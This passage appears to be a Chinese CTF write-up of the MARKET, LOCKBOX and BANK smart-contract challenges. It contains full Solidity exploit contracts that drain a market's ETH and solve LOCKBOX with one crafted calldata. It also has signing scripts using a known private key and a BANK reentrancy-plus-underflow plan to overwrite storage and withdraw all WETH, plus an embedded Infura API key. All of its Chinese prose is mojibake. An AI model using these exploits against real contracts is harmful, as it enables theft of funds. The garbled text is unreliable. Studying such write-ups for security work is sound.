ä¸€ä¸ªtokenId_0ï¼Œå¹¶æ›´æ”¹metadataä¸ºæ”»å‡»åˆçº¦åœ°å€</li><li>å‡ºå”®tokenId_0</li><li>è™šæ„tokenId_1ï¼ŒtokenIdçš„å€¼ä¸º token_0+2 ï¼ˆæ­¤æ—¶tokenId_1.owner=tokenId_0.metadata=æ”»å‡»åˆçº¦åœ°å€ï¼‰</li><li>æ›´æ”¹tokenId_1.nameä¸ºæ”»å‡»åˆçº¦åœ°å€ï¼ˆæ­¤æ—¶tokenId_0.approval=tokenId_1.name=æ”»å‡»åˆçº¦åœ°å€ï¼‰</li><li>å°†tokenId_0 transferFrom ç»™æ”»å‡»åˆçº¦</li><li>å†æ¬¡å‡ºå”®</li></ol><p>æ³¨æ„ï¼Œç”±äºè¦æ±‚æ˜¯è®©Marketåˆçº¦æ‰€æœ‰çš„ETHéƒ½æ¶ˆå¤±ï¼Œè€Œä»£å¸ä»·æ ¼ä¸ç­‰äºå‘é€çš„ä»¥å¤ªå¸æ•°é‡</p><p>æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©è®¾å®šä¸€ä¸ªè¾ƒé«˜çš„tokenPricesï¼Œå¹¶åœ¨ç¬¬äºŒæ¬¡å‡ºå”®ä¹‹å‰è®¡ç®—Marketåˆçº¦ç¼ºå¤±çš„tokenPrices</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.7.0;<br><br>import &quot;./Setup.sol&quot;;<br><br>contract marketExploit &#123;<br>    marketSetup public setup;<br>    EternalStorageAPI public eternalStorage;<br>    CryptoCollectibles public token;<br>    CryptoCollectiblesMarket public market;<br>    constructor(address _setup) payable &#123;<br>        setup = marketSetup(_setup);<br>        eternalStorage = setup.eternalStorage();<br>        token = setup.token();<br>        market = setup.market();<br>        require(msg.value == 70 ether);<br>        bytes32 token_0 = market.mintCollectibleFor&#123;value: 70 ether&#125;(address(this));<br>        //ä¿®æ”¹token_0.metadata, è®©å®ƒç­‰äºaddress(this)<br>        eternalStorage.updateMetadata(token_0,address(this));<br>        //approve token<br>        token.approve(token_0, address(market));<br>        //å–å‡ºè¯¥token_0, tokenIdä¸ºtoken_0<br>        market.sellCollectible(token_0);<br>        //get token_1<br>        bytes32 token_1 = bytes32(uint256(token_0)+2);<br>        //updateName-&gt;approval<br>        eternalStorage.updateName(token_1, bytes32(uint256(address(this))));<br>        // transferFrom<br>        token.transferFrom(token_0, address(market), address(this));<br>        token.approve(token_0, address(market));<br>        //fix price<br>        uint tokenPrice = msg.value * 10000 / (10000 + 1000);<br>        uint missingBalance = tokenPrice - address(market).balance;<br>        //è¡¥å¿ç¼ºå°‘çš„ETH<br>        market.mintCollectible&#123;value:missingBalance&#125;();<br>        //sellAgain<br>        market.sellCollectible(token_0);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="LOCKBOX"><a href="#LOCKBOX" class="headerlink" title="LOCKBOX"></a>LOCKBOX</h2><p>åˆ©ç”¨modifierï¼Œå¥—å¨ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier _() &#123;<br>    _;<br><br>    assembly &#123;<br>        //ç¬¬ä¸€æ­¥ï¼šæ‹¿åˆ°å…¨å±€å˜é‡Stage, åˆ¤æ–­å¦‚æœstageçš„å€¼æ²¡æœ‰æ›´æ–°åˆ™è¿”å›<br>        let next := sload(next_slot)<br>        if iszero(next) &#123;<br>            return(0, 0)<br>        &#125;<br><br>        //ç¬¬äºŒæ­¥ï¼šè°ƒç”¨Stageä¸Šçš„getSelector()å‡½æ•°ï¼Œå°†ç»“æœå­˜å‚¨åœ¨å†…å­˜ä¸­<br>        // keccak(abi.encode(&quot;getSelector&quot;))[0:0x04] = 0x034899bc<br>        mstore(0x00, 0x034899bc00000000000000000000000000000000000000000000000000000000)<br>        pop(call(gas(), next, 0, 0, 0x04, 0x00, 0x04))<br><br>        //ç¬¬ä¸‰æ­¥ï¼šè°ƒç”¨Stageåˆçº¦ï¼Œå‡½æ•°é€‰æ‹©å™¨ä¸ºgetSelector()å‡½æ•°çš„è¿”å›å€¼ï¼Œå‚æ•°ä¸ºCALLDATA[0x04:]<br>        calldatacopy(0x04, 0x04, sub(calldatasize(), 0x04))<br>        switch call(gas(), next, 0, 0, calldatasize(), 0, 0)<br>            //ç¬¬å››æ­¥ï¼šå¦‚æœè°ƒç”¨å¤±è´¥ï¼Œåˆ™REVERT<br>            case 0 &#123;<br>                returndatacopy(0x00, 0x00, returndatasize())<br>                revert(0x00, returndatasize())<br>            &#125;<br>            case 1 &#123;<br>                returndatacopy(0x00, 0x00, returndatasize())<br>                return(0x00, returndatasize())<br>            &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»<code>Entrypoint</code>toç­‰åˆ°<code>Stage1</code>to <code>Stage2</code>ï¼Œ<code>Stage5</code>æˆ‘ä»¬ä¼šå°†ç›¸åŒçš„ calldata ä¼ é€’ç»™æ‰€æœ‰è°ƒç”¨ã€‚æ‰€ä»¥ä¸€ä¸ª calldata è§£å†³é¢˜ä¸­çš„6ä¸ªæ¡ä»¶</p><h3 id="Entrypoint"><a href="#Entrypoint" class="headerlink" title="Entrypoint"></a>Entrypoint</h3><p>éšæœºæ•°é¢„æµ‹ï¼Œä¼ å…¥ <code>bytes4(blockhash(block.number - 1))</code> å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(bytes4 guess) public _ &#123;<br>    require(guess == bytes4(blockhash(block.number - 1)), &quot;do you feel lucky?&quot;);<br><br>    solved = true;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Stage1"><a href="#Stage1" class="headerlink" title="Stage1"></a>Stage1</h3><p>éœ€è¦è·å¾— <code>0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf</code> çš„ç§é’¥ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å‡ºåçš„åœ°å€ï¼Œå…¶ç§é’¥ä¸ºï¼š<code>0x0000000000000000000000000000000000000000000000000000000000000001</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(uint8 v, bytes32 r, bytes32 s) public _ &#123;<br>    require(ecrecover(keccak256(&quot;stage1&quot;), v, r, s) == 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, &quot;who are you?&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šåœ¨ä¸€èˆ¬çš„web3.jsä¸­ï¼Œåœ¨eth-signæ—¶ï¼Œä¼šåœ¨ç­¾åçš„æ¶ˆæ¯å‰åŠ ä¸Š<code>\x19Ethereum Signed Message + len(msg)</code>ä¸€æ®µbytecodeã€‚æ•…éœ€ä½¿ç”¨ä¸åŠ å…¥æ­¤æ¶ˆæ¯çš„eth-signå‡½æ•°åº“ã€‚</p><p>èµ·åˆä½¿ç”¨we3py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> eth_account <span class="hljs-keyword">import</span> Account, messages<br><span class="hljs-keyword">from</span> eth_account.messages <span class="hljs-keyword">import</span> encode_defunct<br><br><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3, HTTPProvider<br><br>rpc = <span class="hljs-string">&quot;https://mainnet.infura.io/v3/0aec7fd42e0a40f28dd6c1a185f7d3e6&quot;</span><br>web3 = Web3(HTTPProvider(rpc))<br><br>messageshash = web3.toHex(web3.sha3(text=<span class="hljs-string">&#x27;stage1&#x27;</span>))<br><span class="hljs-built_in">print</span>(messageshash)<br>private_key_hex = <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span><br><br>signed_message = Account.signHash(message_hash=messageshash, private_key=private_key_hex)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;signature =&quot;</span>, signed_message)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r = &quot;</span>, web3.toHex(signed_message.r))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;s = &quot;</span>, web3.toHex(signed_message.s))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v = &quot;</span>, web3.toHex(signed_message.v))<br><br><br></code></pre></td></tr></table></figure><p>è®¡ç®—å¾—å‡ºç»“æœ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">r</span> =  <span class="hljs-number">0</span>x<span class="hljs-number">370</span>df<span class="hljs-number">20998</span>cc<span class="hljs-number">15</span>afb<span class="hljs-number">44</span>c<span class="hljs-number">2879</span>a<span class="hljs-number">3</span>c<span class="hljs-number">162</span>c<span class="hljs-number">92</span>e<span class="hljs-number">703</span>fc<span class="hljs-number">4194527</span>fb<span class="hljs-number">6</span>ccf<span class="hljs-number">30532</span>ca<span class="hljs-number">1</span>dd<span class="hljs-number">3</span>b<br><span class="hljs-attribute">s</span> =  <span class="hljs-number">0</span>x<span class="hljs-number">35</span>b<span class="hljs-number">3</span>f<span class="hljs-number">2</span>e<span class="hljs-number">2</span>ff<span class="hljs-number">583</span>fed<span class="hljs-number">98</span>ff<span class="hljs-number">00813</span>ddc<span class="hljs-number">7</span>eb<span class="hljs-number">17</span>a<span class="hljs-number">0</span>ebfc<span class="hljs-number">282</span>c<span class="hljs-number">011946</span>e<span class="hljs-number">2</span>ccbaa<span class="hljs-number">9</span>cd<span class="hljs-number">3</span>ee<span class="hljs-number">67</span><br><span class="hljs-attribute">v</span> =  <span class="hljs-number">0</span>x<span class="hljs-number">1</span>b<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ç”±äºæ­¤ç»“æœä¸èƒ½æ»¡è¶³Stage3</p><p>æ‰€ä»¥ä½¿ç”¨åŸå§‹ecdsaSignæ¥ç­¾å</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ethereumjs_util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;ethereumjs-util&quot;</span>);<br><span class="hljs-keyword">const</span> &#123; randomBytes &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; ecdsaSign &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethereum-cryptography/secp256k1&#x27;</span>)<br><br><span class="hljs-keyword">const</span> privateKeyStr = <span class="hljs-string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span>;<br><span class="hljs-keyword">const</span> hashStr = <span class="hljs-string">&#x27;0x&#x27;</span> + (ethereumjs_util.keccak(Buffer.from(<span class="hljs-string">&#x27;stage1&#x27;</span>), <span class="hljs-number">256</span>)).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><br><span class="hljs-keyword">const</span> privateKey = Buffer.from(privateKeyStr.slice(<span class="hljs-number">2</span>), <span class="hljs-string">&quot;hex&quot;</span>);<br><span class="hljs-keyword">const</span> hash = Buffer.from(hashStr.slice(<span class="hljs-number">2</span>), <span class="hljs-string">&quot;hex&quot;</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-comment">// node_modules /@types/secp256k1/index.d.ts</span><br>  <span class="hljs-keyword">const</span> &#123; signature, recid &#125; = ecdsaSign(hash, privateKey, &#123; <span class="hljs-attr">data</span>: randomBytes(<span class="hljs-number">32</span>) &#125;);<br><br>  v = recid + <span class="hljs-number">27</span>;<br>  r = Buffer.from(signature.slice(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br>  s = Buffer.from(signature.slice(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>))<br><br>  <span class="hljs-keyword">if</span> (v != <span class="hljs-number">28</span>) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> rBN = <span class="hljs-string">&#x27;0x&#x27;</span> + r.toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  <span class="hljs-keyword">const</span> sBN = <span class="hljs-string">&#x27;0x&#x27;</span> + s.toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><br>  <span class="hljs-comment">// stage3 require: out of order</span><br>  <span class="hljs-keyword">if</span> (sBN &lt; rBN) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// // stage3 require: this is a bit odd</span><br>  <span class="hljs-keyword">if</span> (sBN.slice(-<span class="hljs-number">2</span>) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;0x&#x27;</span> + v.toString(<span class="hljs-number">16</span>));<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;0x&#x27;</span> + r.toString(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;0x&#x27;</span> + s.toString(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><br><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç­”æ¡ˆ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">v</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1</span>c<br><span class="hljs-attribute">r</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1</span>f<span class="hljs-number">9</span>c<span class="hljs-number">5510565172835329</span>f<span class="hljs-number">4</span>e<span class="hljs-number">0107</span>b<span class="hljs-number">3</span>af<span class="hljs-number">787</span>bf<span class="hljs-number">46</span>d<span class="hljs-number">1690</span>f<span class="hljs-number">7</span>e<span class="hljs-number">81</span>aba<span class="hljs-number">39</span>e<span class="hljs-number">47</span>c<span class="hljs-number">9940</span>d<span class="hljs-number">43</span><br><span class="hljs-attribute">s</span> = <span class="hljs-number">0</span>x<span class="hljs-number">6</span>e<span class="hljs-number">95</span>dc<span class="hljs-number">6553997968</span>a<span class="hljs-number">1</span>be<span class="hljs-number">6</span>cc<span class="hljs-number">8</span>ae<span class="hljs-number">66</span>dc<span class="hljs-number">1730</span>cd<span class="hljs-number">1965</span>f<span class="hljs-number">8</span>b<span class="hljs-number">3</span>e<span class="hljs-number">7114</span>ca<span class="hljs-number">0</span>f<span class="hljs-number">9</span>df<span class="hljs-number">15</span>fc<span class="hljs-number">3</span>e<span class="hljs-number">98</span><br></code></pre></td></tr></table></figure><h3 id="Stage2"><a href="#Stage2" class="headerlink" title="Stage2"></a>Stage2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(uint16 a, uint16 b) public _ &#123;<br>    require(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; a + b &lt; a, &quot;something doesn&#x27;t add up&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>å–äº† 2ä¸ª storageçš„uint ã€‚</p><h3 id="Stage3"><a href="#Stage3" class="headerlink" title="Stage3"></a>Stage3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(uint idx, uint[4] memory keys, uint[4] memory lock) public _ &#123;<br>    require(keys[idx % 4] == lock[idx % 4], &quot;key did not fit lock&quot;);<br><br>    for (uint i = 0; i &lt; keys.length - 1; i++) &#123;<br>        require(keys[i] &lt; keys[i + 1], &quot;out of order&quot;);<br>    &#125;<br><br>    for (uint j = 0; j &lt; keys.length; j++) &#123;<br>        require((keys[j] - lock[j]) % 2 == 0, &quot;this is a bit odd&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ—¶çš„slotéƒ¨ç½²æ˜¯è¿™æ ·çš„</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">slot0</span>    idx      guess v  <br><span class="hljs-attribute">slot1</span>    keys[<span class="hljs-number">0</span>]        r  <br><span class="hljs-attribute">slot2</span>    keys[<span class="hljs-number">1</span>]        s <br><span class="hljs-attribute">slot3</span>    keys[<span class="hljs-number">2</span>]          <br><span class="hljs-attribute">slot4</span>    keys[<span class="hljs-number">3</span>]             <br><span class="hljs-attribute">slot5</span>    lock[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">slot6</span>    lock[<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸‰ä¸ªæ¡ä»¶</p><ol><li><p>keys[idx % 4] == lock[idx % 4]</p><p>ç”±äºidx = 0xff1cï¼Œæ‰€ä»¥idx % 4 = 0</p><p>å³keys[0] == lock[0]</p></li><li><p>keys[i] &lt; keys[i + 1]</p><p>è¦æ±‚å‘ˆé€’å¢æ’åˆ—</p></li><li><p>(keys[j] - lock[j]) % 2 == 0</p><p>å¯¹åº”ä½ç½®çš„å·®å€¼å¿…é¡»æ˜¯å¶æ•°ï¼Œä¸¤ä¸ªå¶æ•°ç›¸å‡è‚¯å®šæ˜¯å¶æ•°ï¼Œä¸¤ä¸ªå¥‡æ•°ç›¸å‡è‚¯å®šä¹Ÿæ˜¯å¶æ•°ã€‚</p></li></ol><h3 id="Stage4"><a href="#Stage4" class="headerlink" title="Stage4"></a>Stage4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(bytes32[6] choices, uint choice) public _ &#123;<br>    require(choices[choice % 6] == keccak256(abi.encodePacked(&quot;choose&quot;)), &quot;wrong choice!&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¦æ±‚åœ¨å‰6å—slotä¸­éƒ¨ç½²ä¸€ä¸ªabi.encodePacked(â€œchooseâ€) </p><p>è¿™é‡Œè¿˜å‰©ä¸‹slot3å’Œslot4ä¸ºç©º</p><p>ç”±äºéœ€è¦æ»¡è¶³å·®å€¼ä¸ºå¶æ•°ï¼Œæ‰€ä»¥åªèƒ½æ”¾åœ¨slot4</p><h3 id="Stage5"><a href="#Stage5" class="headerlink" title="Stage5"></a>Stage5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve() public _ &#123;<br>    require(msg.data.length &lt; 256, &quot;a little too long&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¦æ±‚æ•´ä¸ªdataçš„é•¿åº¦ä¸èƒ½è¶…è¿‡256</p><p>æ‰€ä»¥ç»¼ä¸Šï¼Œå¾—å‡ºæ”»å‡»ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &quot;./Setup.sol&quot;;<br><br>contract lockBoxExploit &#123;<br>    Entrypoint public entrypoint;<br>    constructor(address _setup) public &#123;<br>        entrypoint = lockBoxSetup(_setup).entrypoint();<br>    &#125;<br>    function exploit() public &#123;<br>        bytes memory data = abi.encodePacked(<br>            entrypoint.solve.selector,<br>            uint(uint16(0xff1c) | (uint256(bytes32(bytes4(blockhash(block.number - 1))))),<br>            bytes32(0x1f9c5510565172835329f4e0107b3af787bf46d1690f7e81aba39e47c9940d43), //r<br>            bytes32(0x6e95dc6553997968a1be6cc8ae66dc1730cd1965f8b3e7114ca0f9df15fc3e98), //s<br>            bytes32(0x6e95dc6553997968a1be6cc8ae66dc1730cd1965f8b3e7114ca0f9df15fc3e9a), //æ»¡è¶³å·®å€¼å¶æ•°<br>            bytes32(keccak256(&#x27;choose&#x27;)),<br>            bytes32(0x1f9c5510565172835329f4e0107b3af787bf46d1690f7e81aba39e47c9940d43), // =r<br>            bytes32(0x0000000000000000000000000000000000000000000000000000000000000004)  //åšçš„choice ä¹Ÿå°±æ˜¯æŒ‡å‘abi.encodePakced(&quot;choose&quot;)çš„æŒ‡é’ˆ<br>        );<br>        uint size = data.length;<br>        address entry = address(entrypoint);<br>        assembly&#123;<br>            switch call(gas(),entry,0,add(data,0x20),size,0,0)<br>            case 0 &#123;<br>                returndatacopy(0x00,0x00,returndatasize())<br>                revert(0, returndatasize())<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="BANK"><a href="#BANK" class="headerlink" title="BANK"></a>BANK</h2><p>è¦æ±‚æ˜¯æ¸…ç©ºbankåˆçº¦ä¸­çš„50ä¸ªWETH</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() external view returns (bool) &#123;<br>    return weth.balanceOf(address(bank)) == 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>é˜…è¯»bankä»£ç å¯ä»¥å‘ç°</p><ul><li><p>depositToken, withdrawTokenç­‰å‡½æ•°éƒ½æ²¡æœ‰é˜²æ­¢é‡å…¥çš„æªæ–½</p><ul><li>æ²¡æœ‰<code>nonReentry</code>ä¿®é¥°ç¬¦</li></ul></li><li><p>å­˜åœ¨æ•°ç»„è¶Šç•Œæƒ…å†µ</p><ul><li><p><code>accounts[msg.sender].length--;</code>  </p><p>å¦‚æœæ­¤æ—¶çš„ <code>accounts[msg.sender].length == 0</code> ,åˆ™ä¼šä½¿å¾— <code>accounts[msg.sender].length</code> ä¸‹æº¢å‡º</p><p>ç”±æ­¤å¯ä»¥æ»¡è¶³ <code>setAccountName</code> çš„æ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function setAccountName(uint accountId, string name) external &#123;<br>    require(accountId &lt; accounts[msg.sender].length, &quot;setAccountName/invalid-account&quot;);<br><br>    accounts[msg.sender][accountId].accountName = name;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>account.uniqueTokens--;</code></p></li></ul></li><li><p>å¤æ‚çš„æ•°æ®ç»“æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Account &#123;<br>    string accountName;<br>    uint uniqueTokens;<br>    mapping(address =&gt; uint) balances;<br>&#125;<br><br>mapping(address =&gt; Account[]) accounts;<br></code></pre></td></tr></table></figure><p>ç»“åˆ <code>setAccountName</code> å‡½æ•°ï¼Œå¯ä»¥åœ¨ä»»ä½•æˆ‘ä»¬æ„Ÿå…´è¶£çš„<a href="https://sissice.github.io/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/">Storage</a>è¿›è¡Œå†™å…¥</p></li></ul><p>äºæ˜¯æƒ³åˆ°å¯ä»¥å…ˆåˆ©ç”¨é‡å…¥ä½¿ <code>accounts[msg.sender].length</code> ä¸‹æº¢ï¼Œå†åœ¨Storageå†™å…¥æˆ‘æ„Ÿå…´è¶£çš„å€¼ï¼Œæ¯”å¦‚æˆ‘çš„è´¦æˆ·çš„WETHçš„ä½™é¢ç­‰ï¼Œç„¶åå†è°ƒç”¨<code>withdraw</code>å‡½æ•°å–å‡ºåˆçº¦ä¸­æ‰€æœ‰çš„WETHåˆ°æˆ‘çš„è´¦æˆ·ä¸Šã€‚</p><h3 id="é‡å…¥å’Œä¸‹æº¢"><a href="#é‡å…¥å’Œä¸‹æº¢" class="headerlink" title="é‡å…¥å’Œä¸‹æº¢"></a>é‡å…¥å’Œä¸‹æº¢</h3><p>åˆ†æ<code>withdarwToken</code>å‡½æ•°å‘ç°ï¼Œæœ‰å¦‚ä¸‹ä¸¤ä¸ªå‡½æ•°æ¶‰åŠåˆ°å¤–éƒ¨åˆçº¦çš„è°ƒç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">ERC20Like(token).balanceOf(msg.sender)<br>ERC20Like(token).transferFrom(msg.sender, address(this), amount)<br></code></pre></td></tr></table></figure><p>å¹¶ä¸”withdarwTokenå’ŒcloseLastAccountéƒ½ä¼šæ¶‰åŠåˆ° <code>accounts[msg.sender].length--;</code>  </p><p>ç”±æ­¤å¾—åˆ°ä¸€ä¸ªé‡å…¥é€»è¾‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">deposit(0, address(this), 0) // ç¬¬ä¸€æ¬¡è°ƒç”¨balanceOfé‡å…¥,len=1,uniqueTokens == 0<br>    withdraw(0, address(this), 0) // ç¬¬äºŒæ¬¡è°ƒç”¨balanceOfé‡å…¥,len=1,uniqueTokens == 0<br>        